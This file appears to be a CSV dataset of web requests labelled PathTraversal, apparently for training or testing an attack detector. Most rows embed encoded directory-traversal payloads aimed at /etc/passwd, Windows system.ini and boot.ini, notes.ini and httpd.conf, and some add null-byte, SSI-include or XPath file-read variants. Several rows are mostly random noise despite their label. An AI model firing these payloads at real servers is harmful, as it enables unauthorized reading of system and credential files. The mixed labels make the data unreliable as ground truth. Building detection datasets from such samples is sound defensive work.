id,class,vector
7766,PathTraversal,/ohEDiW79evf_jnkT6H/ppnFf.Tw/imeK.nsf?
7768,PathTraversal,/ryAog7EDEf/vpe/0SEaJAr75Cu4DZ@/reaShZaeei/cVG._FUL/h5gXOXAg/urc@UKF-fs6R/hogpcWjgf/4y_wnA.SE/nrvthRy/eh.asp?2y=Asi1Tthcecdaud&mcmeaxd=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fieetve%2Fme%2Fenicntiset%2Fst.php
7774,PathTraversal,etlhalmetpcgn1=6 &puVZnNosoi=iu7F0&yrhsvwats=saao be0Ia&at=32NKHz2QYUO&mtVaeraz=oXa38nTzs5n&6anci8e=lnlkUe62rnof&hoomDjs5h3lqf=..\..\..\..\..\..\..\..\..\WINNT\system.ini&9laOQmD=lG9-O&iCTGF=bb> c&Rmailj0DnodeQ3=zedKedc)s;tateit
7778,PathTraversal,/zJU3Q/aleo09ro3/Eyg/acsasrttUeah/mD2cL2w/mDagO0mpCf/nArttBl6rthpyyysm/w9BUs_/tHfmochawhereZOLK3a/lRhb2n-QklsWRy1/nihyntnl/yMYDETuKX9KHJu..css?ihicnncah=o%3A%5Cwindows%5Cboot.ini
7780,PathTraversal,/rt2k6Su-5Q9LSd/fawtCjebgrbjVSbiW.png?srdchSO=W&al72gzkk=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&nwhatetaaehwtw=mUt%3Cl+foshutdownr&yAten=ev6ZA&ulyoes=9R+e%26rEthrc%3F%3Aoevariw&0gTa8=aaegmesHesugihe&tmncnowfbotro=nwab3Me_K&gUPA25B=w&neEo3=9049514&66yM.HdL_RK0=5
7785,PathTraversal,/amB4arE/7g/lmcAgBldjiRZwKwbtMI/QvW/J5SFjS0i_fB8in/5SdBfCc/skl2-1/o_@Zc6eOiO.mdb?cwep=Ozetcbr%3Ae%2Buxp_lirS6taqg&an=m%3A%5Cautoexec.bat&31-2fFZDjeO=167&nbt=ojs%3FyEno&MatP49oeedhbotM=0744&nyobgayednoosmt=8991428&hnp4escaesjo7w=6319&llntosuta=934028
7791,PathTraversal,/jyGhlIHavn9gMp3@Rp/e5cO/Gf5IFpositionfgPwwinntecho/gVx1obd2wI6DI0taol/rnh2nC3CH8y_s7ra_R3N/ltieattopsbzfb/nsnobsebs/uesiEmdurytboero/o1zMPxlgRh-DETeHSi/gfrxtlh0vda/haidNte.gif?Why=17&shN=U1ioedbj&zauoett87=usc&onHzooe4=.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F
7793,PathTraversal,/1eeamguediobadnrhg/childVunionQni0q/iygwEa3ani/m90weD_m6/dBinwn/P3XOqSUx/1.RVrups6LbN/nTYg6vcpf8uE/rstgrl9iMuPhas/KfDNhtpassinsertpasswdoQz0M-.mdb?GlyOF2iZyh=arHimgexoO&a@wgetH2=9840301742&stbhc=1923&oefy=5496&enmiobqeebi=..........................WINNTsystem.ini
7796,PathTraversal,/mphHiEnTjc/e_Z4072M/tnr5segSiigx/e5Sh5sU32@2MviV.E1z2/tp3NJ07bhuh3Lhx/r1Y/mgM1vR/tat/z-DFn@avlLCAXj1.U.5m/i6d.mu5Oit/B0PG.msf?YknJa4E_B0union=.%2F..%2F..%2F..%2F..%2F..%2F&mkq=em+ou&yioedaeorexeeu=93391138
7801,PathTraversal,/inQhgelendjha57eN/eobduO3eia/ai/e0rhherop1tE3N4iIoas/ipdltuts8Oasd459rep/bV4_mq4p2JKRa/salml.jpeg?Oaax5hll=4&asauREiPtd=970&lvnee=D%3A%5C%5CWINNT%5C%5Cwin.ini&fmIimu=41759181&rlo3achy=inIteduotidus&naa5t=+3o4x36+srallhid
7811,PathTraversal,/aIfKH0TYesAAbt.nrBO/documentvdjDhWq33FHB/JD1inwvqSl./0dT3ntneEnwHS/jf.cc5-p1Jf8Irx.mdb?msiuhey=sperlo&oahhuneerdmn=.%2F..%2F..%2F..%2F..%2F..%2F&yrvata49sl3nlos=nbworA&_qYfUH@S=aipax8llnmeiocaa
7818,PathTraversal,/uyfdensth2o/cVsiIorEwp-n/nsttpaaysir5Ngh/02wTMXqpY/bEvh3lQmaBV/iuRhioPaesyoR4aton/6optgJ4CWxuSscriptPM/tcyfTg9bvnTrnbask/hhUofoA8Q9/Ie45olity/Ysadcrea0rmrecg.png?ufHe79nhegoehie=..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&Az=rl+sznerL+ar&soptphpSyMv=mahr&Sroviaqlnxt2t2=etLabsa
7822,PathTraversal,/rg3otEanc9cos4/m9tpB3qzhW/gpUX_pq98xY.dll?umhhotpHcdlHaP=144429&rfrqsedoshNuio=ggzx&_zJ6Qy=ceuLtsi%29o+&dRbsI=edMCkEM&tst7H0Rnhte=ltayeheeeteitef0o&gkrapaRlE=845046&geBfEdn=rostyleo%40%2Bom&sBgl=tDUeL7U1.l.U
7826,PathTraversal,/error/\..\..\..\..\winnt\win.ini?
7827,PathTraversal,/dC8XWl/nGTNn6qLODn9vXfmeY/nxW@Y/tZK8w0X.asmx?mNtmddnga=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
7835,PathTraversal,/iW3GaQzJnfjY/dgU33.cv8GaNr1/tr2eaaofeePqidl0/oexedtPa4bamhero.gif?@8dropt0boot.ini.WvV-=%252e%252e.%5C%25252f%2F%5C%25252f%2F...%5C%25252e..%252e
7857,PathTraversal,t0e0ccrtdsF=0428337&d3a=57&T3linkvr1metaini=55748697&neOu1eyl=Ra\mbts0snbSa&lpl=i&ptf7=715709&Goeueavi702cs=iizDavdK48i&3hc=dHaeqern
7868,PathTraversal,/pe/eqhTcn0cvTrjtsdt.php?etntohleea8aeh=2Coic8%5D+2oacks&koct=55735&ond3suufei=ji&okb3sbd6t=5826892&2lgdia8=LEhoehmcneEi5open&R58ssen5=nirbhtpass&rl7m=..........................WINNTsystem.ini&i4J73ino=nbalikerdocument1rwle&connectVgIE=2yPyjUCLc6&r7nc8=39575&aXvobjectM2Nmail5dlsin=37645377&emku=a%404ZQi3V4Z&kg9juh3=lDr&leoavm1dve=fnsd3ereotse
7871,PathTraversal,/nSoee5neo/uBTkfje5P25F/0iheottS9nOa1/eQrr0PMTseCE.js?nnimh=l5EKoIJJWsQ&ueeag7eirtg=group+byulah&0er9biennnoipT=mKsyFl&0reilah=qSEPv&ccbeacldfyr=.%2F..%2F.%2F..%2F
7872,PathTraversal,/dY9F2aYAD1P/ejOWBy98tsrN5lIpBaKk/mthbitm7aae/vKG5.js?C-NQc=N3&divqDL@..SMUQ1=hJTcfe&pzdin=ehas&uom=Xttaehwaft&ala=phr%5Cx&twftn8abeie7aCd=228&aeoehm62nw7yft4=aaYf&c1rb=toptbseando6mNiwnmnjbciw&DKt_httpyFnetcat=73724900&0aoc0aayn2ot=laeymoNh5syniorli9&etare6feoh=eYH5dBBkRU&7s3=zoncqfteB&JodocumentOkiDYAY8T=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&Rk1TGsswP=3&oT0p0x7J8X=fs6gzmu
7873,PathTraversal,/sodeciOvkCnJU/lsVZy@dZunion6yh/wrcotscjorsrJefas4e/f_a2-jHXLQ@32/HX1sNpWGM/trteranweHthb/ehzi/iuhaabfjqdk/hcooeurdi5ybsrh4w/aeL5xW/hodnuh8rraos1/sfrlnzIafDXerIslptat.exe?ead4eE=8&srp=..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&usr35Emetaz=ga&tfPAnnyrnsertt=5375&nzWNUKJB=9&dhtapFMfie=737466&x7oiielykp4c=hdropqhoL&tabrzeo4=a3kNZ_&sb395uthfsc=ttR3wjrTou&gr5Namerm=701656764&MZn-x7FX=meaf1n6y9zaH&POiPS7=48
7876,PathTraversal,/lGE3P7lptl/vjorwdEaitNpt9Msh/r1Ee/Y1ZXVX.cfm?pacsmesey=tUs3U&rihatEcaz=e%2Feq&efajaaisytRtb=..%2F..%2F..%2Fusr%2Fdsqqdsqsd.xml&gnv=dIadh2ath3dr&nhrsmat2y=5fM.xLP&a9aitilefmvatn=elE
7887,PathTraversal,/hGQqG8ih_CBG/pMQTGU_4Z8ujXo/ahzuEHmuN3X086S/6tnattieneoth7o/tuixGw@rfE.I-xl_r/lv98/i6qkb/HOO1Ozzn/openRIb2ZghomeIha/tTh6_F@cB0U8/noix7iHetdax3ot.php3?ToohrlevI0S=oXSWiYC%40S8m&e8sTarleebsaeD=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&ety=izEmtesm&9speew=aZhA7JBwjM&gmteto=aarnah+b4
7890,PathTraversal,/7tnxSoeirterswp/passwdqMcSdd1kUaB0F/aiLv6i6af4a5/wIgOtl/fdO.tiff?eAuEFt44=quescS1cUgt%7Ct&lssnidhitee=pll&jimocha3y6Zuwp-e=wDtdteRoxta&mOkrqhegehfmuot=itotdEin&openiC7Hw=teo15o&vvgroup
7894,PathTraversal,/qhw1NFWuJpTzD@b-/binNGLx2Iqg2WgR%u/pl/nu8nkE3ZisRRh9s5ir/6yhkrocNRs/uttoe2wfrzss/DR.php4?mnt5eg=collection%28+file%3A%2F%2F%2Fc%3A%2Fctt%2F8Ota.xml+++++%29
7898,PathTraversal,nitswdeiHxE=ses0erHiim&fdjnebachslbf=eewteaznesuon&Rls9a2=33489390&rtrep=tiotjdnuht1ONemiHw&tkan5=nQ4G3&if=2tLlNatqN3&SrtvumoN==5ysatlR4ol&REnpsner9na0a=76919820&id=aceoeB&gN6=leeiu&sdjSdaDoTnb=07414547&oebza5=cs@&eiejwc=passwd at
7900,PathTraversal,/6egi6ryyArciinee/sSIlSMX6TWFe8XixWJ/a9rerinsnmgriei7utdp.shtml?@vD0U=..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini
7903,PathTraversal,/nqyuwy@yu.cfm?ganhs=..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&tnarm0r=m%25nfCrr&tjEs7tn=soo1uetsvn&2rHa=52784&ug=149368
7913,PathTraversal,/ewoe8oeseB/bpqQMb3FNiQG7A9J@/hAE6ZV/tp@iW/ex4myaaq/z0childdhUGz/ovps/jmenetrt/ecseswzoh/rtFQPjg.nsf?sn8eHd=iKoQ5DjjhR&A7ziirheEi=wgeteei&7odtrd8h3a9ir=..........................WINNTsystem.ini
7921,PathTraversal,/error/\..\..\..\..\winnt\win.ini?
7928,PathTraversal,/at/o13AYE8OC_LuOyf/rsatsZah.dll?ro0eaeef=7212263&0IinFrX8@1tmpwE=lnU&ershCadet8a0Id=teNte2e&lhoojm=8&0ehqsl5ogt=033&anwsLrhce7drsue=50470&NeeIcseuesw65n=eWN2&Yv8g=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fapoenu.conf
7941,PathTraversal,/le/eatkyentusprixM7/PDtrb/aIjh2bmc/tssgs/n6d80.XWeT3HSGlvqYN/wwL/UBcTacceptB/nes0x/igiaLL5.php4?tOee6nvsny51QbH=ediv6e3eact%40us&ilr=shutdownhRiin&ti0etc=doc%28file%3A%2F%2F%2Fc%3A%2Fq9%2FiHh.xml+++++%29&oy=eyeoTRCdQKI&Doyaours9c=ibuupdwhdsibO2ihdw&dny2w=ia&U@FbWUQ-Efstyle=2831&lesudhIlcjrtn=+p
7949,PathTraversal,/formc8du-Olike5F/ejsi/.U@.anph-y6P1wK/senu9ylbmpgatthnse/eXpe7eyl/iFGNCC5wHvtd/it/rs/eJF/NraehvbfroeayE.jpg?42Ltelnet17urb=isljnlr&PwzV=ueztires3rSinw6n0m&services5execfwp-aCk5=92971&gs6eelnb=rm%3A1&lossraTrokha=oUSHk&mhivuyHeohc=+ebodyTmo+%3Da+&ls97hn=ipetEdohp0ieuthssb&teanbltyonw2roF=0143577143&EHVkyNh=eitixl&ZKHp3=075355250&Steedzaetrd=x8f9iflitptsir&et3p49trqltiiar=usr+access_logivfeeed+
7956,PathTraversal,/rOpdFwttqeotu/egn/nOB/i.qC0p.D@a/c-yL9D/fwn8nlatjn3fmysl/upJ.php?itlc1PinoaTcer=gKvvvw&bFRJnetcat56_PO=t%3A%5Cwindows%5Cboot.ini&apEs71sClnbed=eH%40sa&gl=htns%3B%3A3hodn0oaa&tng=2&l-Altr6=ch9&2e0iee5I=Aotne&gdnste02mAfe=zn+eheo&nut=tiiospasswdfLzrue&qoinObpr=eu5plhvasotithe&a00wradI=kOdSs&ny12oe=pe3tmp%5D2eHtoOsamrRpasswd&vbbe=io+e
7960,PathTraversal,/rBy0QfIv@YCVK9EO/Nzk/2I8K.1C/0GzScY-GTT.g5GLNYTfZ/Of5ibduoneiliorlwiB/6Eis/imtay.jpeg?ifaatslnvoi=111&eOp7orIpendp=md2r3qe7mxmlrdg2&eei=fwindow.openetmbOfsu&zjssre0c=%3Enodei%3CutidexfeusrwediR&3TNxperlS=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&jmdbteh=+Ketb
7974,PathTraversal,/.nsf/../notes.ini?
7975,PathTraversal,/.nsf/../notes.ini?
7979,PathTraversal,/dkwypOEzZ0kRKhZR/soewTv_8z/saSbkYHlRjAyN/wa/irarwSVUlf@VyB.png?renetoollkih6dE=ou&walswnid=oM6gmt4R&DziysEnXE=sUheveE_n&WwastnEli=5309396&net4ai3nsihxk=%5CWINNT%5Csystem.ini&enylmsseht6fea=tmpg&phmSse=0&R83=2brgXU.&Sr=3499&rcegefd=lzhpW5&maiaeiuns=is%407NthWZKzB
7981,PathTraversal,/elio/amtttaotos7ee.exe?Xm9TbB=%2Fetc%2Fhttpd%2Fhttpd.conf&o4DsfhinoI=oiIh%40NP7g6oy&eergcsleggajbi=+0ed&ywJsjq822kii=3&AeimestdtelThb=760910&ODDIO9=hlt0aylgewh9&nlsdid=ru&obirourutet=tabigel
7987,PathTraversal,.////////////////////////?
7989,PathTraversal,/sYEGBYTOKoJ9nVs2/emjudmiL8egzA/wieooyoFBC8cnheaoye.php3?ertgoh1gehaeoO=a+0oEr%5Da%3A%29f+l%3Azinput1&0eeH=+nhrstgeyNclih&8Q5EaI.4C.Y-=rju629UxT&xrophpGOJ=openlre&eqreogJtzNMMgsa=apMttae3add+&trren3=%7Er&vcdauneSc=roouu&o5dizwh7b=hrh0&onnptp=%2Fetc%2Fpasswd
7999,PathTraversal,eiasrouyetle=w6 c@tz&dl=~lcdocumentfevalase3zi6h0arerh&GnodedMVqRK=uorpoetslpth&tmpyc=dunorzsEy8IN
8002,PathTraversal,/y3fUjmSuQeYMhtacces/hx4BT2W.LInDhttpG5/4tsesoat46atIishue9/nSw/36PvAsQngVz6tm4HS/mfOPtwcu/rRKQVCV/O1/sZvnXsZ0xY2GwAtaLT/ygF/fo7InhoqSltriroyt.bin?oeie=5fblutperlh+&tthbdHir0ieqeh=9ZU3pft2-zhaaalyaIuh&hOmre3wjd=o0oOEp.e&tdledin=cddchtezm&iq=%2Fetc%2Fpasswd&H@varR0dacceptLBZgP=o80tFiOqQ&neuolmuaon4=186&1te7=46139152
8004,PathTraversal,/eKie/a3YriFXZZoiE/325.zUPn9q5s-/oc7yPH/3COEmLQT0.pl?pnoNGotd=%3C%21--++++%23include+virtual%3D%22%2Fetc%2Fpasswd%22+++--%3E&snohn=06099&Ojktis=2
8017,PathTraversal,iyce0ehtsdaet=wherezv&xmluBbgsoundW120T=3euopusrng&qmtoedifneag1=yCr]4%&iWt=uuope7esetz&9saogsn=ssie ae hwuel$&ejtiectuisarLea=beuaoa:whsqus&0oreammmr4Cgih=cPDr@ajlKQZh&rametae4dZ5=ncie &@WVKNVk6CVM=RaldAsboet&nSevsh=formv&etnvd=\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd%00.html&VMU@=3749666781&rtthen6aiibax=meta2ev~c5;aE9glH]lnr=h&Sleslclee=e0z4ge2RVW0
8018,PathTraversal,vtsmaryeseL58=irhd9nlj&du24h1n0naty=495721&e6RscahhdAeo=imncwthsbeSh&_IbuophpqKd=621218839&oMca471WJUJD=\<uw )lMi9Alnn@sel&ed1eaRnfdieoiee=\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd%00.html&szkxra=1t]z5mGcr7oa&RB7mXch8T=sl<5
8024,PathTraversal,/iyrdLsth.asp?2Eu6QnetcatM4HG=iruifwmeamgtiist&Aha1qhtlswmOmu=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat
8026,PathTraversal,/loisnrttiio6nee/dienetyalerifn/2M7b/eQvzNXXRin9qz86/iSXVn-/h5fcp/oala6wDeh81iefs/zwY131XX27swmqxX/z_omw2mjtN.php4?3v8H=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWINDOWS%5Csystem.ini&bfttehnedhttivQ=ceumuf_fLTrZ&t-oD=eLh9Hzr5yX&taia=709&soenfltwn=+inputy&eym25rtres9xaba=8022548955&0myada=daes4&f7bAlooistxttot=477957&nsnfutuyoD=odttth75d&at9lrc3nu=dtaWZvelkdgroup+by3a&MektMmsnhlh6o=887045421&rsr91i9toahss=xbUzm&e4ioCgylalrm=673420&nee=Ag4c
8039,PathTraversal,/LeitonEgoeneyr/ezS_Rf0iEhtgkHhT/nOelr80s8ssnu/t.0iZ/8MsSC/H7/RRo7iiaewcqnaune8se/dh9yuhlYKeanimOsp.css?QGwRjX2=7568184&7tGen1xsreHn=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&muqb6=etrcnorarenetcatwhsb1%5Crt
8040,PathTraversal,/.nsf/../notes.ini?
8045,PathTraversal,8fadoyht2=5 Ewconnectn&wi3ewdms=44458&ax=\.\.\/\.\.\/\.\.\/\.\.\/etc\/passwd%00.html
8048,PathTraversal,/error/\..\..\..\..\winnt\win.ini?
8050,PathTraversal,/4yuHuEn7p/creie/utznttheoSealw/nUu2943wTA/jTpJO.FuU6LM0/tidnhAaeie3dtrtGo/pf4cTiKc6tV8CQ8k1xp/ashr56zcoihnheo/nOROm36aahshti4deyN/9u.cgi?o4ese=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
8059,PathTraversal,/arom9htti/xammesySaO7ura6st/t_Y6ZUCk-5f_MUi_Ay6l/ndOhee009oeo4lwadchi/iiSwsxrshAwto/kformZTPxW/k4dAdoee/kdp.mspx?iyemzsgoptpb=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&Raki=Osfy8suxhtaccesRxml%27%27s
8063,PathTraversal,/aegydyj/e78e4eeTnklrfososgim/1AgLIlinkHmS4yA3@.php4?keyewghTdNmotp=1&b7lceaosoEdPws=157&nyy3=4592165&yGKYKO=entscriptexec&lTXm=fZv&9lprerusd=58068607&VZK4delete_9Vcn=94899&FyFIK3pAO=tu+ure%2FNr&3jfoyLtegd=aenlzaSEmlnfbsiob
8077,PathTraversal,/twuloxtoisuhsojY/mnldt0/IlfwnavaElEtgitMl/ovul4K/ee3FljL_uJMZ6B59q/OK.mdb?_orEchttplocation=thcshtpassfuFSboot.inio&osg=ihrj&pboot.ini2W-4E2C=3sonRir&ao2g2oevsrMira=2ifsncatmin%7Cb&QWI9Q=h%3Fe&T5cdeyn=file%3A%2F%2F%2Fe%3A%2Fryt%2Faov%2Fi6eunm5s.xml
8088,PathTraversal,/i@XGJQI6CqmO/plMRu/ahnYs/pumneotien3mkk/srle4tx2c/9execwgetX50accept2Pinclude_A9F/ob4g2xZLG/tbqZIH8@H-sAyZ/scriptI5ugAX/gPwTl.mspx?2aucseweo=js19tsucxoiemt&uepqnk3js8WOar=fgedp1s&Tqx6mbIinseRr=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion
8092,PathTraversal,/.nsf/../winnt/system.ini?
8098,PathTraversal,/ea7o6y4nWlJHtw6y/Btpo7CtmprmiEhMk76/dNbinputlsAsH_BL/mochaDGqpwindow.open/lhsn.asp?updateGorkimg0img1=tgez7telhto9&htpass8dOl=0tecnlibmn%3Es3&fHr1aLfttj9=+eemik&hmg=mr-rssiesafayevbscriptNect&2iobemzlromiono=1&FRRtRJ4I=at+&nGhfzs=yd7oznpez&Mt4roth=1668989&5dmoedf=.%2F..%2F..%2F..%2F..%2F..%2F&rxeont=62619&duAw0ydl7X=a3ritcvwdr&e05maaweato6=laef&mno4sexleicogne=2240&dtreeida4ea=g8z-1D1wS
8115,PathTraversal,/regQgMSn@Ulo2V/eA/mcndccEitgtt/4jcySD@1myzncebL/KKidw3@h8M1/H.JDsnodeJvcobject/yeu/sD/eN9D.pRiNLU.5r/yogotargqts/safbnlus18abmetyrm/vltkWFJOsx.shtml?ea2Ruvrod9=8%3A%5Cwinnt%5Cboot.ini&dIllecwi=hvaceenx
8122,PathTraversal,/tfe/rJiQ4CNo@so-AZWYx6rU/eneTaeidedeyebe/sdirMs13/gQgN@/aepjvtEpgdysaiio.php3?Id9iOizP5p=haone&thdu7oe1oaseem=64&eakn8SsEshlo=34&i4eaoeafntlpeh=379095&gotuszmtittei=ta&rtaw2dPtlto=nhttps
8125,PathTraversal,/rdetoEel7BlsrcfmnBe/K0xD/EhtrTso/ep8KrDkwHCmidQoifF/tWFAzmDIEPZeCMkM/rnweeaPhfh/svPv6V_Z@lGa.cgi?cpsn8pue=raqkfdoh&mnqttu=5864&qoke7weiBeil=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&ysrR=sarelrhskep8sgeu3&iotipzoeeso=9413538599
8140,PathTraversal,BczchildYdgkDy=>4i&pgeti3riE=46&iImuoeteitJqeil=vh@a&yo=..\..\..\..\WINDOWS\system.ini&ta1mwHmtoiiti3=lg-ways4sK&eMeparci=selectner3cmd+i&eeebne2polwadat=Nneufnasrn7
8143,PathTraversal,/Zh/yd8kwxfsvEeJsPQTZMP/1cvg5kjSR40sk-9f0vF/JahtmsIankhsCtBfh/aMGSVJ13ouSEc.mspx?ahjt1st=orfl&_or.h2SSzDUQq=62&ancaeheo=186701&o-Mjtmpaq88bodyV=collection%28+++++file%3A%2F%2F%2Fc%3A%2Fhfih%2Fei7st.xml+++%29
8145,PathTraversal,/hyit8hdrgR3lnI3he/IHBC.8yC/eypatCiws/sPi6kr/tt6eeitaji/inhso.aspx?dai2c4ilaNosm=t4zjgg&catlXcZp2tPO=2710&VQrJdRN6Qf=dto+aORhl&nJzlRPq1bm9a=asahit&diw=joeriosabn&dt=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&zh3u9eEQ=dordomec%5ChaEti&aiejvretREa=Ioen%29&BvDT6ZJdj=uctyntrr&trhalaoes=6832&erlrsf9uRDrck=5484176&gcteHagesmscJes=sn&miuo=hehbntxiswinrqri&sock_streamdBlikez=jisnti58Itperlesh
8150,PathTraversal,/.nsf/../notes.ini?
8157,PathTraversal,/tIr56nrap3aone/tv2ByCV/eXk2BE/3cnr942xthnwstTzaG/o5SLp4PT/rkaehtrm/hh0ef.nb29/d5/7fromCxBlikeKb8zI4lk/qfeopS3iaaugaenN3/3DSJGR7WTC/RtAbtNgdom2jtat.jsp?R81P=3&odosnheio=733417&lR=2Eeh&mRcas=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&1nceilhxa=qlnabt
8176,PathTraversal,/t.O0OKtZOi/sQI8Ef/63yPrIrm37sEsomp2lta/ert9/8coom6nocajlrn.asp?XG_pE1varwX=+ymrdaeBeiO85s5ca&ty5oeos4ei=e%27hyh&oeSj2PHSYHhall=rGms5H-&allERtpg=s%2Bm
8180,PathTraversal,/.nsf/../winnt/win.ini?
8198,PathTraversal,Tfmbieee=huopentdtelnett&kcsT=\.\.\/\.\.\/etc\/passwd&fn6ulrs=7 0a<&msci= ioq &awasv6B=37&threiSw=lM1TXhIOgiX&mOuosoreeuse=oi+di\mbandIy4&r6gO91BS_9F=Ahceni4iaN8c9tt&uwou=rnhn3yLnrkly2eeL&yq=64923939&us5aTete=nI_IyvHA.qp&ezezib=1homeuus
8203,PathTraversal,////?
8220,PathTraversal,/m82sReCousFcEet2/tscjeu/txYZ/x1fa9VWmY@P91.png?nhqill=wMyUg1&husi1i=+ldGnen&erohabfhhan=6&EAeanepIej=e+%29reneEpbgsoundesin%3C&nahlhrr=T%5D%3Azdnnao8eria%5D&cMawball9d-8=3386612&S8umnrR0rei=yaplb5td&lndtepnuLiogao=70868871&pdhne9entee3o5=..........................WINNTsystem.ini&K4@6OA0LGNwC=nc9xieaa+k%27ukF%3Cte%5Ci2&ioaT1sidgn=SieeDpdtEewrdiht1&mppN=87&oclrsa=1%40Gyp&xe2aqSbtD=o++fromautoexec
8228,PathTraversal,KeZX=eRo(\4&IeeJnhdx=te
8230,PathTraversal,/CzRdgAhttp.C0a6E_/VGwget6bFXfJgkZYC_/hiosDmeae8p/ttfstw0ot/ahtgttxuaaobt.png?ta=645178&tezeoartohenaic=dsc6oneeoa&ltdg6=m+eautoexecitowj+oso
8257,PathTraversal,/./?
8264,PathTraversal,/dih5anx/l03wCSodw/rE1ant/5evalMx4Ux/HTaGPdOIF.shtml?d1ho=n6KaxcXi&srte=%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd%2500.html&V2s3qrO7r3j3=nso&6cYTkTNTaa=%3Decmdees%2Fioh&s8rj3rlylnrE=oOservices%29swindow.opensoztnbftwinnt
8276,PathTraversal,/cIpZK_9T/sstd/fil68Ylmijuuw/so/rfHjXXMWPd/Hsci8rh/bdvtv/g58lr5agB2tu3D-k@Tqf/uPj5iO6k@-3HVtRC6E/u9L7JDTJIEZKv@g.jpg?V0ilia=36392312&from4EHaxp=er&Zldfei=hhn&terutksdsrEa1e=29209679&tRbtChnt=iml%24%7Ery&syse=oanrmertjHehh&tiot0ane3dt1I=ashutdown5lwryh&uslgrksth=63959&as04e6Nh=3shtpassgahC&fldwbodTo=e
8278,PathTraversal,/r0ynndd4r/yacusea/sbgC7q.asp?5cshjwhH9e0rsa=3565978&pernnooden=6972248&de=file%3A%2F%2F%2Fr%3A%2Fiyy0%2Fenusn%2Fpedu5mwe.xml&Tdoe82sh7=aR&erua=45860665&isoaadntNsea=r5jxGgIsZb2&vvltmpr=sofae8fe7sa&uiut=x%27
